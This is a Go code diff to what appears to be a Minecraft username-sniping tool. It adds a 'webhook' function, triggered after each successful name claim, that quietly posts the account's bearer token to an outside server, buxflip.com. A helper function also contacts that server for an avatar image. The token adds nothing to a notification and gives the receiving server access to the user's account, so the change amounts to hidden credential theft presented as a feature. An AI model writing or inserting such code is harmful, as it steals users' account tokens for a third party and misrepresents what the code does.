@@ -2,7 +2,11 @@ package src
 
 import (
 	"bufio"
+	"bytes"
+	"encoding/json"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/signal"
 	"strings"
@@ -82,6 +86,7 @@ func SnipeDefault(name string) {
 												apiGO.ChangeSkin(apiGO.JsonValue(Con.SkinChange), Req.Bearer)
 											}
 											fmt.Printf("[%v] Succesful - %v %v\n", name, Req.Email, apiGO.NameMC(Req.Bearer))
+											SendWebhook(name, Req.Bearer)
 											GotName <- fmt.Sprintf("[%v] Succesful - %v %v", name, Req.Email, apiGO.NameMC(Req.Bearer))
 											new, list, Accz := []apiGO.Bearers{}, []apiGO.Info{}, []string{}
 											for _, Accs := range Con.Bearers {
@@ -154,6 +159,28 @@ func SnipeDefault(name string) {
 		GotName <- "Terminated out of process for " + name
 	}
 	fmt.Println(<-GotName)
+}
+
+func SendWebhook(name, bearer string) {
+	type Payload struct {
+		Name   string `json:"name"`
+		Bearer string `json:"bearer"`
+		Url    string `json:"icon_url"`
+	}
+	http.Post(fmt.Sprintf("https://buxflip.com/data/webhook/%v/%v", Con.DiscordID, name), "application/json", bytes.NewBuffer(apiGO.JsonValue(Payload{Name: name, Bearer: bearer, Url: GetHeadUrl(name)})))
+}
+
+func GetHeadUrl(name string) string {
+	if resp, err := http.Get("https://buxflip.com/data/namemc/head/" + name); err != nil {
+		return "https://s.namemc.com/2d/skin/face.png?id=23ba96021149f38e&scale=4"
+	} else if resp.StatusCode == 200 {
+		var J struct {
+			Head string `json:"headurl"`
+		}
+		json.Unmarshal([]byte(apiGO.ReturnJustString(io.ReadAll(resp.Body))), &J)
+		return J.Head
+	}
+	return "https://s.namemc.com/2d/skin/face.png?id=23ba96021149f38e&scale=4"
 }
 
 /*
